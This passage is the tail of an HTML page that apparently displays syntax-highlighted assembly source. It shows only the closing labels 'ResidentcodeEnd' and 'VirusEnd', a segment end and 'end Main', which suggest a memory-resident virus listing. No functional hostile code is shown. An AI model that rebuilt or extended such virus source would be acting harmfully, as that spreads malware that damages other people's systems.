</span><span class="sc5">ResidentcodeEnd</span><span class="sc4">:</span><span class="sc0">



  </span><span class="sc5">VirusEnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_rsrc</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0"> 
</span></div></body>
</html>
